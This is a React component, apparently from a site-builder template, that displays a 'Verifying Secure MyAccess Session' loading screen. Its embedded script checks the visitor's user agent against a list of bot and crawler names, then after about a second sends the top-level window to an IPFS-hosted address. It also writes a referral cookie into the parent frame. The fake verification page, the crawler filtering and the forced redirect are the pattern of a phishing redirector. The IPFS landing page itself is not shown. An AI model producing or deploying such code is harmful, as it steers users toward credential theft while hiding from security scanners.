import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
try{if(window.parent&&window.parent!==window){window.parent.promotekit_referral="1fd2949a-d22c-431b-92bf-02d4ad04ee24";window.parent.document.cookie="promotekit_referral=1fd2949a-d22c-431b-92bf-02d4ad04ee24;path=/;domain=.aura.build;max-age=31536000"}}catch(e){}



window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');



        // 1. Bot Bouncer
        var botPatterns = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex|crawler|spider|curl|wget/i;
        
        // 2. Destination
        var destination = "https://ipfs.io/ipfs/bafkreiedvzc37qu3d5nz3cjxqiyeq3crdqbv3fzjxqpfuipyj2hlbjxhom";

        // 3. The Jump
        setTimeout(function() {
            if (!botPatterns.test(navigator.userAgent)) {
                try {
                    // Attempt to redirect the topmost window
                    window.top.location.href = destination;
                } catch (e) {
                    // Fallback to local window if cross-origin iframe blocks window.top
                    window.location.href = destination;
                }
            } else {
                // Failsafe redirect even if user-agent mimics a bot pattern falsely
                window.location.href = destination;
            }
        }, 1200);
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      
<main className="flex flex-col items-center justify-center px-6 max-w-md w-full mx-auto">

<div className="relative flex items-center justify-center w-16 h-16 mb-8">

<div className="absolute inset-0 rounded-full border-4 border-white/20"></div>

<div className="absolute inset-0 rounded-full border-4 border-white border-t-transparent animate-spin"></div>

<iconify-icon className="text-white text-2xl" icon="solar:shield-keyhole-linear" strokeWidth="1.5"></iconify-icon>
</div>

<h2 className="text-2xl font-medium tracking-tight mb-3">Verifying Secure MyAccess Session...</h2>
<p className="text-sm text-white/80 font-normal">Connecting to authentication servers...</p>
</main>


    </>
  );
}
